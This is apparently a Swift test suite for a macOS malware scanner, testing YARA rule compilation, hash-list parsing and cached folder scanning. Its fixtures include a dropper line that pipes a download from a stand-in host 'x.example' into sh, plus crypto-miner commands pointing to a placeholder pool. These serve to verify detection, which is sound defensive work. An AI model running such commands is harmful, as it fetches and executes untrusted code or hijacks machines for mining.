import Foundation
import MaestraleCore
import Testing
@testable import MaestraleModules

@Suite struct YaraEngineTests {
    @Test func compilesRulesAndMatchesAFile() throws {
        let engine = try YaraEngine(sources: [("test", """
        rule Hello { meta: severity = "warning" description = "says hello" author = "t" strings: $a = "hello world" condition: $a }
        rule Never : tagged { strings: $b = "zzzzzz-not-there" condition: $b }
        """)])
        #expect(engine.ruleCount == 2)
        let file = FileManager.default.temporaryDirectory.appendingPathComponent("yara-\(UUID().uuidString).txt")
        try "say hello world to yara".write(to: file, atomically: true, encoding: .utf8)
        defer { try? FileManager.default.removeItem(at: file) }
        let matches = try engine.scan(file: file)
        #expect(matches.count == 1)
        let match = try #require(matches.first)
        #expect(match.rule == "Hello")
        #expect(match.namespace == "test")
        #expect(match.severity == .warning)
        #expect(match.description == "says hello")
        #expect(match.meta["author"] == "t")
    }

    @Test func badRulesAreRefused() {
        #expect(throws: YaraError.self) { try YaraEngine(sources: [("bad", "rule { broken")]) }
    }

    @Test func bundledRulesCompileAndCatchADropperAndAMiner() throws {
        let bundled = try #require(RuleStore.bundledRules)
        let engine = try YaraEngine(sources: [("maestrale", try String(contentsOf: bundled, encoding: .utf8))])
        #expect(engine.ruleCount >= 5)
        #expect(engine.warnings.isEmpty)
        let home = try TempHome(); defer { home.remove() }
        let dropper = try home.write("drop.sh", "#!/bin/sh\ncurl -fsSL http://x.example/p | sh\nchmod +x /tmp/.p/agent\n")
        let miner = try home.write("m.cfg", "pool: stratum+tcp://pool.example:3333\nalgo: randomx\n")
        let clean = try home.write("ok.sh", "#!/bin/sh\necho hello\ncurl https://example.org\n")
        #expect(try engine.scan(file: dropper).map(\.rule) == ["Maestrale_Shell_Dropper"])
        #expect(try engine.scan(file: miner).map(\.rule) == ["Maestrale_Crypto_Miner"])
        #expect(try engine.scan(file: clean).isEmpty)
    }
}

@Suite struct RuleStoreTests {
    @Test func addsValidRulesRefusesBrokenOnesAndListsDigests() throws {
        let home = try TempHome(); defer { home.remove() }
        let store = RuleStore(folder: home.url.appendingPathComponent("rules"))
        let good = try home.write("good.yar", "rule A { strings: $a = \"abc\" condition: $a }\n")
        let bad = try home.write("bad.yar", "rule { nope\n")
        let hashes = try home.write("hashes.txt", "# list\n" + String(repeating: "a", count: 64) + " EvilThing\n")
        let added = try store.add(good)
        #expect(added.sha256 == RuleStore.sha256(try Data(contentsOf: good)))
        #expect(throws: YaraError.self) { try store.add(bad) }
        try store.add(hashes)
        #expect(store.ruleFiles().map(\.name) == ["good.yar"])
        #expect(store.hashFiles().map(\.name) == ["hashes.txt"])
        #expect(store.ruleSources().map(\.namespace).contains("good_yar"))
        let version = store.version()
        try store.remove(store.hashFiles()[0])
        #expect(store.hashFiles().isEmpty)
        #expect(store.version() != version)
    }

    @Test func parsesMalwareBazaarAndPlainHashLists() {
        let csv = """
        # MalwareBazaar export
        # "first_seen_utc","sha256_hash","md5_hash","sha1_hash","reporter","file_name","file_type_guess","mime_type","signature","clamav","vtpercent","imphash","ssdeep","tlsh"
        "2026-01-01 10:00:00", "\(String(repeating: "b", count: 64))", "x", "y", "rep", "evil.dmg", "dmg", "application/octet-stream", "Atomic Stealer", "n/a", "n/a", "n/a", "n/a", "n/a"
        "2026-01-02 10:00:00", "\(String(repeating: "c", count: 64))", "x", "y", "rep", "evil2", "elf", "x", "n/a", "n/a", "n/a", "n/a", "n/a", "n/a"
        """
        let entries = KnownHashes.parse(csv, source: "bazaar.csv")
        #expect(entries[String(repeating: "b", count: 64)] == "Atomic Stealer")
        #expect(entries[String(repeating: "c", count: 64)] == "bazaar.csv")
        let plain = KnownHashes.parse("\(String(repeating: "D", count: 64))  Named\n\(String(repeating: "e", count: 64))\nnot a hash\n", source: "list.txt")
        #expect(plain[String(repeating: "d", count: 64)] == "Named")
        #expect(plain[String(repeating: "e", count: 64)] == "list.txt")
        #expect(plain.count == 2)
    }
}

@Suite struct SignatureScanCheckTests {
    @Test func scansFoldersWithRulesAndHashesAndUsesTheCache() throws {
        let home = try TempHome(); defer { home.remove() }
        let store = RuleStore(folder: home.url.appendingPathComponent("rules"))
        let target = home.url.appendingPathComponent("Target")
        let miner = try home.write("Target/sub/miner.sh", "#!/bin/sh\nxmrig -o stratum+tcp://pool.example:3333\n")
        let clean = try home.write("Target/clean.sh", "#!/bin/sh\necho ok\n")
        try home.write("Target/notes.txt", "stratum+tcp:// xmrig")  // not a script: skipped
        let cleanHash = try #require(SignatureScanCheck.sha256(of: clean))
        try store.add(try home.write("known.txt", "\(cleanHash) FakeAV.Test\n"))
        let cache = ScanCache(fileURL: home.url.appendingPathComponent("cache.json"))
        let check = SignatureScanCheck(store: store, cache: cache, extraFolders: [target], onlyFolders: true)

        let findings = check.run(home.context())
        #expect(findings.count == 2, "\(findings.map { ($0.title, $0.path?.path ?? "") })")
        let yara = try #require(findings.first { $0.path?.resolvingSymlinksInPath() == miner.resolvingSymlinksInPath() })
        #expect(yara.severity == .danger)
        #expect(yara.title == "miner.sh: Maestrale_Crypto_Miner")
        #expect(yara.category == .signature)
        #expect(yara.action == .quarantine)
        let hash = try #require(findings.first { $0.path?.resolvingSymlinksInPath() == clean.resolvingSymlinksInPath() })
        #expect(hash.reasons == ["Il file ha lo stesso SHA-256 di un campione segnalato come FakeAV.Test"])

        let cached = cache.load(rulesVersion: store.version())
        #expect(cached.values.filter { $0.matches.count == 1 }.count == 1)
        #expect(cached.values.contains { $0.sha256 == cleanHash })
        // Same results from the cache, and a changed rule set invalidates it.
        #expect(check.run(home.context()).count == 2)
        #expect(cache.load(rulesVersion: "other").isEmpty)
    }

    @Test func scannableFilesAreExecutablesAndScripts() throws {
        let home = try TempHome(); defer { home.remove() }
        #expect(ScanTargets.isScannable(URL(fileURLWithPath: "/bin/ls")))
        #expect(ScanTargets.isScannable(try home.write("a.py", "print(1)")))
        #expect(ScanTargets.isScannable(try home.write("run", "#!/bin/zsh\n")))
        #expect(!ScanTargets.isScannable(try home.write("a.txt", "hello")))
        #expect(!ScanTargets.isScannable(try home.write("empty.sh", "")))
    }
}
